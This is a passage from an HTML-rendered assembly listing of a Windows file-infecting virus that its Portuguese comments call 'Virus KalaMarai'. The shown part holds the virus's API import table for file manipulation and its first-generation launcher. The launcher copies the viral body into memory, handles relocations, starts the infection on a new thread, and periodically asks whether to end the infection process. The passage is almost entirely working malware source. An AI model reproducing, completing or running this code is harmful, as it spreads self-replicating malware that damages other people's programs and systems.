</span><span class="sc5">ResumeThread</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFileTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileAttributesA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VirtualFree</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetTickCount</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetDriveTypeA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">lstrlen</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Sleep2</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DeleteFileA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SuspendThread</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">v_fim</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">                           </span><span class="sc1">;final do codigo viral</span><span class="sc0">


</span><span class="sc5">_GMHA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GPA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                     </span><span class="sc1">;variaveis usadas pelo stub</span><span class="sc0">
</span><span class="sc5">tempo</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                   </span><span class="sc1">;stub do virus</span><span class="sc0">
       </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Virus KalaMarai"</span><span class="sc0">
       </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Deseja continuar?"</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                                </span><span class="sc1">;confirma execuá∆o do virus</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">vaila</span><span class="sc0">
  </span><span class="sc5">saifora</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">                         </span><span class="sc1">;ihhh... usu†rio amarelou!</span><span class="sc0">
  </span><span class="sc5">vaila</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GMHA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;salva ponteiros para APIs essenciais</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_GMHA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GMHA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GPA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_GPA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GPA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">BASE</span><span class="sc4">=</span><span class="sc2">00400000h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BASE</span><span class="sc0">                            </span><span class="sc1">;ebp=imagebase</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;esi=pe header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_Size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;esi=relocaá‰es</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;edx=limite</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">reloctable</span><span class="sc0">
  </span><span class="sc5">reloca</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">-</span><span class="sc5">BASE</span><span class="sc0">            </span><span class="sc1">;bloco aponta para o virus?</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">aponta</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;n∆o, pega proximo bloco</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">reloca</span><span class="sc0">                                </span><span class="sc1">;ainda existem relocaá‰es?</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc0">                         </span><span class="sc1">;aloca alguma memoria</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;copia virus(pra testar relocs)</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;ecx=zero</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                                 </span><span class="sc1">;*ThreadID</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">entrada</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;ebp=inicio do virus</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">                        </span><span class="sc1">;executa virus</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">pergunta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Virus KalaMarai"</span><span class="sc0">
       </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Terminar processo?"</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                                </span><span class="sc1">;termina processo de infeá∆o?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">saifora</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tempo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">                   </span><span class="sc1">;5,10,15...</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tempo</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">                               </span><span class="sc1">;espera 5+ minuto</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pergunta</span><span class="sc0">                             </span><span class="sc1">;pergunta de novo...</span><span class="sc0">
  </span><span class="sc5">aponta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;relocaá∆o aponta para o virus</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">                           </span><span class="sc1">;base das relocaá‰es</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">;ecx=numero de relocaá‰es</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">proxima</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;relocaá∆o nula?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">nula</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000111111111111b</span><span class="sc0">                </span><span class="sc1">;limpa TIPO</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">                                    </span><span class="sc1">;armazena deslocamento da anterior</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numeroreloc</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">nula</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">proxima</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">reloca</span><span class="sc0">                               </span><span class="sc1">;bloco processado...</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">    </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
